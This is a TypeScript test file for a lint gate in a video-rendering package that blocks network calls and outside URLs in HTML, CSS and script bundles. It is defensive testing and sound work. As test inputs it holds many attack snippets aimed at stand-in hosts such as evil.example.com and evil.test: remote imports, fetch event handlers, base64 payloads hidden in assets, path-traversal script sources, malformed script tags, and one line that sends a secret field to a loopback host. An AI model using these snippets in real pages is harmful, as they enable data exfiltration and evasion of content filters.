import * as http from 'node:http';
import * as path from 'node:path';
import { lintProject } from '@hyperframes/lint';
import { describe, expect, it } from 'vitest';
import type { CheckIssue, RenderProjectBundle } from '@memberjunction/video-studio-core';
import { HyperFramesRenderBackend } from '../hyperframes-backend.js';
import {
    FakeRenderBackend,
    MJ_NETWORK_API_CODE,
    MJ_NON_BUNDLE_URL_CODE,
    RunLintGate,
    SortCheckIssues,
    StageRenderBundle,
} from '../index.js';

function makeBundleWithEntryContent(
    entryContent: string,
    extraFiles: Array<{ Path: string; Content: string }> = [],
): RenderProjectBundle {
    return {
        Format: '16:9',
        EntryFile: 'index.html',
        Files: [{ Path: 'index.html', Content: entryContent }, ...extraFiles],
        Assets: [],
        DataSnapshot: {},
        Seed: 1,
    };
}

describe('lint-gate static and HyperFrames lint checks', () => {
    it('passes a clean self-contained bundle with data:, blob:, #frag, and valid relative paths', async () => {
        const html = [
            '<!doctype html>',
            '<html>',
            '<head>',
            '  <link rel="stylesheet" href="styles/app.css" />',
            '</head>',
            '<body>',
            '  <div id="root" data-composition-id="main" data-duration="2" data-fps="30" data-width="1920" data-height="1080">',
            '    <a href="#section-1">Jump</a>',
            '    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" />',
            '    <img src="blob:null/1234" />',
            '    <img src="assets/local.png" />',
            '  </div>',
            '  <script src="scripts/app.js"></script>',
            '</body>',
            '</html>',
        ].join('\n');

        const bundle = makeBundleWithEntryContent(html, [
            { Path: 'styles/app.css', Content: '.box { background: url("../assets/local.png"); }' },
            { Path: 'scripts/app.js', Content: 'import { label } from "./helper.js";\nconsole.log(label);' },
            { Path: 'scripts/helper.js', Content: 'export const label = "Revenue Growth";' },
        ]);

        const staged = await StageRenderBundle(bundle, { InjectPreamble: false });
        try {
            const backend = new FakeRenderBackend();
            const result = await RunLintGate(bundle, staged.RootDir, backend);
            expect(result.Passed).toBe(true);
            expect(result.BlockRender).toBe(false);
            expect(result.Issues).toEqual([]);
        } finally {
            await staged.Cleanup();
        }
    });

    it.each([
        ['HTML img https', '<img src="https://evil.example.com/a.png" />'],
        ['HTML script protocol-relative', '<script src="//cdn.example.com/gsap.js"></script>'],
        ['HTML link javascript:', '<a href="javascript:alert(1)">x</a>'],
        ['HTML srcset remote', '<img srcset="local.png 1x, https://evil.example.com/2x.png 2x" />'],
        ['HTML inline style url()', '<div style="background-image: url(https://evil.example.com/bg.png)"></div>'],
        ['Inline CSS @import', '<style>@import "https://evil.example.com/theme.css";</style>'],
        ['Inline CSS url()', '<style>.hero { background: url(http://evil.example.com/a.jpg); }</style>'],
        ['Inline JS import from https', '<script>import x from "https://evil.example.com/mod.js";</script>'],
        ['Inline JS dynamic import', '<script>import("https://evil.example.com/dyn.js");</script>'],
        ['Inline JS string literal URL', '<script>const u = "https://evil.example.com/api";</script>'],
        ['Relative path escaping bundle root', '<img src="../../outside.png" />'],
        ['HTML event handler with entity-encoded URL', '<div onclick="fetch(&#34;https://evil.test&#34;)">x</div>'],
        ['Unresolvable gsap/dist script path (producer CDN rewrite vector)', '<script src="p/q/gsap/dist/../../evil-pkg@1.0.0/x.js"></script>'],
    ])('catches MJ_NON_BUNDLE_URL vector (%s) with BlockRender: true', async (_label, snippet) => {
        const bundle = makeBundleWithEntryContent(`<!doctype html><html><body>${snippet}</body></html>`);
        const staged = await StageRenderBundle(bundle, { InjectPreamble: false });
        try {
            const result = await RunLintGate(bundle, staged.RootDir, new FakeRenderBackend());
            expect(result.BlockRender).toBe(true);
            expect(result.Passed).toBe(false);
            expect(result.Issues.some((i) => i.Code === MJ_NON_BUNDLE_URL_CODE)).toBe(true);
        } finally {
            await staged.Cleanup();
        }
    });

    it('blocks <script src> and JS import specifiers that target bundle.Assets instead of bundle.Files', async () => {
        const payloadBase64 = Buffer.from('fetch("https://evil.test");', 'utf8').toString('base64');
        const scriptAssetBundle: RenderProjectBundle = {
            Format: '16:9',
            EntryFile: 'index.html',
            Files: [
                {
                    Path: 'index.html',
                    Content: '<!doctype html><html><body><script src="p.bin"></script></body></html>',
                },
            ],
            Assets: [
                {
                    Key: 'p',
                    RelativePath: 'p.bin',
                    MimeType: 'application/octet-stream',
                    DataBase64: payloadBase64,
                },
            ],
            DataSnapshot: {},
            Seed: 1,
        };
        const stagedScript = await StageRenderBundle(scriptAssetBundle, { InjectPreamble: false });
        try {
            const res = await RunLintGate(scriptAssetBundle, stagedScript.RootDir, new FakeRenderBackend());
            expect(res.BlockRender).toBe(true);
            expect(res.Passed).toBe(false);
            expect(res.Issues.some((i) => i.Code === MJ_NON_BUNDLE_URL_CODE && i.File === 'index.html')).toBe(true);
        } finally {
            await stagedScript.Cleanup();
        }

        const importAssetBundle: RenderProjectBundle = {
            Format: '16:9',
            EntryFile: 'index.html',
            Files: [
                {
                    Path: 'index.html',
                    Content: '<!doctype html><html><body><script type="module">import "./m.js";</script></body></html>',
                },
            ],
            Assets: [
                {
                    Key: 'm',
                    RelativePath: 'm.js',
                    MimeType: 'text/javascript',
                    DataBase64: payloadBase64,
                },
            ],
            DataSnapshot: {},
            Seed: 1,
        };
        const stagedImport = await StageRenderBundle(importAssetBundle, { InjectPreamble: false });
        try {
            const res = await RunLintGate(importAssetBundle, stagedImport.RootDir, new FakeRenderBackend());
            expect(res.BlockRender).toBe(true);
            expect(res.Passed).toBe(false);
            expect(res.Issues.some((i) => i.Code === MJ_NON_BUNDLE_URL_CODE && i.File === 'index.html')).toBe(true);
        } finally {
            await stagedImport.Cleanup();
        }
    });

    it.each([
        ['fetch()', '<script>fetch("/api");</script>'],
        ['XMLHttpRequest', '<script>const x = new XMLHttpRequest();</script>'],
        ['WebSocket', '<script>const ws = new WebSocket("ws://localhost");</script>'],
        ['EventSource', '<script>const es = new EventSource("/events");</script>'],
        ['navigator.sendBeacon', '<script>navigator.sendBeacon("/log", "x");</script>'],
        ['RTCPeerConnection', '<script>new RTCPeerConnection();</script>'],
        ['importScripts', '<script>importScripts("worker.js");</script>'],
        ['navigator.serviceWorker', '<script>navigator.serviceWorker.register("sw.js");</script>'],
        ['window.open', '<script>window.open("about:blank");</script>'],
        ['window.location.href =', '<script>window.location.href = "/other";</script>'],
        ['bare location.href =', '<script>location.href = "https://evil.test";</script>'],
        ['self.location =', '<script>self.location = "https://evil.test";</script>'],
        ['top.location.replace()', '<script>top.location.replace("https://evil.test");</script>'],
        ['HTML onerror fetch()', '<img src=x onerror="fetch(\'https://evil.test\')">'],
        ['HTML onclick entity-decoded fetch()', '<div onclick="fetch(&#34;https://evil.test&#34;)"></div>'],
        ['meta refresh', '<meta http-equiv="refresh" content="0;url=index.html">'],
        ['base tag', '<base href="https://evil.example.com/">'],
        ['link rel=preconnect', '<link rel="preconnect" href="assets">'],
    ])('catches MJ_NETWORK_API vector (%s) with BlockRender: true', async (_label, snippet) => {
        const bundle = makeBundleWithEntryContent(`<!doctype html><html><head>${snippet}</head><body></body></html>`);
        const staged = await StageRenderBundle(bundle, { InjectPreamble: false });
        try {
            const result = await RunLintGate(bundle, staged.RootDir, new FakeRenderBackend());
            expect(result.BlockRender).toBe(true);
            expect(result.Passed).toBe(false);
            expect(result.Issues.some((i) => i.Code === MJ_NETWORK_API_CODE)).toBe(true);
        } finally {
            await staged.Cleanup();
        }
    });

    it.each([
        ['query string on gsap/dist traversal', 'gsap/dist/../../evil-pkg@1.0.0/x.js?v=1', 'evil-pkg@1.0.0/x.js'],
        ['backslash on gsap/dist traversal', 'gsap/dist/..\\..\\evil-pkg@1.0.0\\x.js', 'evil-pkg@1.0.0/x.js'],
        ['leading slash on gsap/dist traversal', '/gsap/dist/../../evil-pkg@1.0.0/x.js', 'evil-pkg@1.0.0/x.js'],
        [
            'HTML entity-encoded dots on gsap/dist traversal',
            'gsap/dist/&#46;&#46;/&#46;&#46;/evil-pkg@1.0.0/x.js',
            'evil-pkg@1.0.0/x.js',
        ],
        ['trailing space on gsap/dist traversal', 'gsap/dist/../../evil-pkg@1.0.0/x.js ', 'evil-pkg@1.0.0/x.js'],
        ['trailing tab on gsap/dist traversal', 'gsap/dist/../../evil-pkg@1.0.0/x.js\t', 'evil-pkg@1.0.0/x.js'],
        ['leading space on gsap/dist traversal', ' b/gsap/dist/../../evil-pkg@1.0.0/x.js', 'b/evil-pkg@1.0.0/x.js'],
    ])(
        'blocks script src (%s) even when resolved target exists in bundle.Files (producer CDN rewrite bypass)',
        async (_label, rawSrc, filePath) => {
            const bundle = makeBundleWithEntryContent(
                `<!doctype html><html><body><script src="${rawSrc}"></script></body></html>`,
                [{ Path: filePath, Content: 'export const ok = 1;' }],
            );
            const staged = await StageRenderBundle(bundle, { InjectPreamble: false });
            try {
                const res = await RunLintGate(bundle, staged.RootDir, new FakeRenderBackend());
                expect(res.BlockRender).toBe(true);
                expect(res.Passed).toBe(false);
                expect(res.Issues.some((i) => i.Code === MJ_NON_BUNDLE_URL_CODE && i.File === 'index.html')).toBe(true);
            } finally {
                await staged.Cleanup();
            }
        },
    );

    it('blocks <script title="a>b" src="p.bin">, stray-quote script tags (a/b/c), and scans .css bundle.Files loaded as scripts', async () => {
        const payloadBase64 = Buffer.from('window.location = "https://evil.test";', 'utf8').toString('base64');
        const malformedScriptSnippets = [
            '<script title="a>b" src="p.bin"></script>',
            '<script x=a" title="b>c" src=p.bin></script>',
            '<script x=a" src=p.bin></script>',
            '<script x=a">location=`http://127.0.0.1:8080/pairquote-inline?d=`+MJVideo.Data.Secret;//"></script>',
        ];
        for (const snippet of malformedScriptSnippets) {
            const malformedBundle: RenderProjectBundle = {
                Format: '16:9',
                EntryFile: 'index.html',
                Files: [
                    {
                        Path: 'index.html',
                        Content: `<!doctype html><html><body>${snippet}</body></html>`,
                    },
                ],
                Assets: [
                    {
                        Key: 'p',
                        RelativePath: 'p.bin',
                        MimeType: 'application/octet-stream',
                        DataBase64: payloadBase64,
                    },
                ],
                DataSnapshot: {},
                Seed: 1,
            };
            const staged = await StageRenderBundle(malformedBundle, { InjectPreamble: false });
            try {
                const res = await RunLintGate(malformedBundle, staged.RootDir, new FakeRenderBackend());
                expect(res.BlockRender).toBe(true);
                expect(res.Passed).toBe(false);
                expect(res.Issues.some((i) => i.Code === MJ_NON_BUNDLE_URL_CODE && i.File === 'index.html')).toBe(true);
            } finally {
                await staged.Cleanup();
            }
        }

        const cssAsScriptBundle = makeBundleWithEntryContent(
            '<!doctype html><html><body><script src="s.css"></script></body></html>',
            [{ Path: 's.css', Content: 'location = "//evil.example/css-as-script";' }],
        );
        const stagedCss = await StageRenderBundle(cssAsScriptBundle, { InjectPreamble: false });
        try {
            const res = await RunLintGate(cssAsScriptBundle, stagedCss.RootDir, new FakeRenderBackend());
            expect(res.BlockRender).toBe(true);
            expect(res.Passed).toBe(false);
            expect(res.Issues.some((i) => i.Code === MJ_NETWORK_API_CODE && i.File === 's.css')).toBe(true);
        } finally {
            await stagedCss.Cleanup();
        }
    });

    it('scans non-standard script extensions such as .cjs for MJ_NETWORK_API and MJ_NON_BUNDLE_URL', async () => {
        const bundle = makeBundleWithEntryContent('<!doctype html><html><body></body></html>', [
            { Path: 'helper.cjs', Content: 'fetch("https://evil.test");' },
        ]);
        const staged = await StageRenderBundle(bundle, { InjectPreamble: false });
        try {
            const result = await RunLintGate(bundle, staged.RootDir, new FakeRenderBackend());
            expect(result.BlockRender).toBe(true);
            expect(result.Issues.some((i) => i.Code === MJ_NETWORK_API_CODE && i.File === 'helper.cjs')).toBe(true);
            expect(result.Issues.some((i) => i.Code === MJ_NON_BUNDLE_URL_CODE && i.File === 'helper.cjs')).toBe(true);
        } finally {
            await staged.Cleanup();
        }
    });

    it('merges backend.Lint issues and sorts deterministically by (Category, File, Line, Code)', async () => {
        const unsorted: CheckIssue[] = [
            { Code: 'B_CODE', Category: 'RemoteUrl', Severity: 'Error', Message: 'b', File: 'b.html', Line: 10 },
            { Code: 'A_CODE', Category: 'Lint', Severity: 'Warning', Message: 'a', File: 'b.html', Line: 2 },
            { Code: 'A_CODE', Category: 'Lint', Severity: 'Error', Message: 'a2', File: 'a.html', Line: 5 },
            { Code: 'A_CODE', Category: 'Lint', Severity: 'Error', Message: 'a1', File: 'a.html', Line: 1 },
        ];
        const sorted = SortCheckIssues(unsorted);
        expect(sorted.map((i) => `${i.Category}:${i.File}:${i.Line}:${i.Code}`)).toEqual([
            'Lint:a.html:1:A_CODE',
            'Lint:a.html:5:A_CODE',
            'Lint:b.html:2:A_CODE',
            'RemoteUrl:b.html:10:B_CODE',
        ]);
    });

    it('HyperFramesRenderBackend.Lint makes zero network requests on remote <video src> and normalizes issue.File to bundle-relative paths', async () => {
        const hits: string[] = [];
        const loopbackServer = http.createServer((req, res) => {
            hits.push(req.url ?? '/');
            res.writeHead(200);
            res.end('ok');
        });
        await new Promise<void>((resolve) => loopbackServer.listen(0, '127.0.0.1', resolve));
        const addr = loopbackServer.address();
        const port = typeof addr === 'object' && addr ? addr.port : 0;

        // Missing data-composition-id triggers a @hyperframes/lint diagnostic while <video src="http://..."> tests no-egress
        const html = [
            '<!doctype html>',
            '<html>',
            '<body>',
            `  <video src="http://127.0.0.1:${port}/clip.mp4"></video>`,
            '</body>',
            '</html>',
        ].join('\n');
        const bundle = makeBundleWithEntryContent(html);
        const staged = await StageRenderBundle(bundle, { InjectPreamble: false });
        try {
            const hfBackend = new HyperFramesRenderBackend();
            const lintOutcome = await hfBackend.Lint(staged.RootDir, 'index.html');
            expect(hits).toEqual([]);
            expect(lintOutcome.Issues.length).toBeGreaterThan(0);
            for (const issue of lintOutcome.Issues) {
                if (issue.File) {
                    expect(issue.File).toBe('index.html');
                    expect(issue.File.includes(staged.RootDir)).toBe(false);
                }
            }

            const report = await lintProject(staged.RootDir, path.join(staged.RootDir, 'index.html'), {
                host: 'cli',
            });
            expect(report.results.length).toBeGreaterThan(0);
        } finally {
            await staged.Cleanup();
            await new Promise<void>((resolve) => loopbackServer.close(() => resolve()));
        }
    });

    it('scans inline <script> and <style> blocks with U+0130 (İ) prefix, recognizes </script >, </SCRIPT>, </script foo>, </style >, ignores </script-x>, </script!>, </style-x>, and scans 50,000 repeated \\" in under 200 ms', async () => {
        const { ScanAuthoredFilesForLintIssues } = await import('../lint-gate.js');

        for (const closeTag of ['</script >', '</SCRIPT>', '</script foo>']) {
            const bundle = makeBundleWithEntryContent(
                `<!doctype html><html><body><p>İ</p><script>fetch("https://evil.test");${closeTag}</body></html>`,
            );
            const issues = ScanAuthoredFilesForLintIssues(bundle);
            expect(issues.some((i) => i.Code === MJ_NETWORK_API_CODE)).toBe(true);
            expect(issues.some((i) => i.Code === MJ_NON_BUNDLE_URL_CODE)).toBe(true);
        }

        const styleWithI = makeBundleWithEntryContent(
            '<!doctype html><html><head><title>İ</title><style>@import url("https://evil.test/a.css");</style ></head><body></body></html>',
        );
        expect(ScanAuthoredFilesForLintIssues(styleWithI).some((i) => i.Code === MJ_NON_BUNDLE_URL_CODE)).toBe(
            true,
        );

        for (const fakeClose of ['</script-x>', '</script!>']) {
            const bundle = makeBundleWithEntryContent(
                `<!doctype html><html><body><script>/*${fakeClose}*/fetch("https://evil.test");</script></body></html>`,
            );
            const issues = ScanAuthoredFilesForLintIssues(bundle);
            expect(issues.some((i) => i.Code === MJ_NETWORK_API_CODE)).toBe(true);
            expect(issues.some((i) => i.Code === MJ_NON_BUNDLE_URL_CODE)).toBe(true);
        }

        const fakeStyleClose = makeBundleWithEntryContent(
            '<!doctype html><html><head><style>/*</style-x>*/@import url("https://evil.test/a.css");</style></head><body></body></html>',
        );
        expect(ScanAuthoredFilesForLintIssues(fakeStyleClose).some((i) => i.Code === MJ_NON_BUNDLE_URL_CODE)).toBe(
            true,
        );

        const attackJs = '"\\' + '\\"'.repeat(50_000);
        const attackBundle = makeBundleWithEntryContent('<!doctype html><html><body></body></html>', [
            { Path: 'attack.js', Content: attackJs },
        ]);
        const start = performance.now();
        const issues = ScanAuthoredFilesForLintIssues(attackBundle);
        const elapsedMs = performance.now() - start;

        expect(issues).toEqual([]);
        expect(elapsedMs).toBeLessThan(200);
    });
});
